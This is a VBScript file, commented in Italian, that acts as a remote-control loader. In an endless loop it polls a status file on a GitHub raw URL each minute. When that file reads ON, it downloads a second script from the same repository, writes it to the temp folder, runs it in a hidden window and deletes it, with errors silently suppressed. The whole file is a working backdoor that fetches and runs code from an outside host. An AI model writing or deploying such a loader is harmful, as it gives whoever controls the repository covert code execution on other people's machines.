Option Explicit
On Error Resume Next

Dim shell, fso, xmlHttp
Dim urlStatus, urlPayload
Dim statusContent, payloadContent
Dim tempScriptPath, fileTemp
Dim giaEseguito ' Variabile per tracciare l'esecuzione

' --- CONFIGURAZIONE ---
urlStatus  = "https://raw.githubusercontent.com/StangaSquola/ProvaControlloRemoto/main/status.txt"
urlPayload = "https://raw.githubusercontent.com/StangaSquola/ProvaControlloRemoto/main/script.txt"

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' Inizialmente impostiamo che non è stato ancora eseguito nulla
giaEseguito = False

' --- LOOP DI CONTROLLO ---
Do
    xmlHttp.Open "GET", urlStatus, False
    xmlHttp.SetRequestHeader "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"
    xmlHttp.Send

    If xmlHttp.Status = 200 Then
        statusContent = UCase(Trim(xmlHttp.responseText))
        statusContent = Replace(statusContent, vbCr, "")
        statusContent = Replace(statusContent, vbLf, "")
        
        ' --- LOGICA ONE-SHOT ---
        If InStr(statusContent, "ON") > 0 Then
            ' Esegue solo se NON è stato già eseguito durante questo periodo di "ON"
            If Not giaEseguito Then
                
                xmlHttp.Open "GET", urlPayload, False
                xmlHttp.SetRequestHeader "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"
                xmlHttp.Send
                
                If xmlHttp.Status = 200 Then
                    payloadContent = xmlHttp.responseText
                    tempScriptPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\task_remoto.vbs"
                    
                    Set fileTemp = fso.CreateTextFile(tempScriptPath, True)
                    fileTemp.Write payloadContent
                    fileTemp.Close
                    
                    shell.Run "wscript.exe """ & tempScriptPath & """", 0, True
                    If fso.FileExists(tempScriptPath) Then fso.DeleteFile tempScriptPath
                    
                    ' DOPO L'ESECUZIONE: Segna come eseguito
                    giaEseguito = True
                End If
            End If
        Else
            ' Se lo stato è OFF (o comunque non ON), resetta la flag
            ' Così al prossimo "ON" lo script potrà correre di nuovo
            giaEseguito = False
        End If
    End If

    WScript.Sleep 60000
Loop
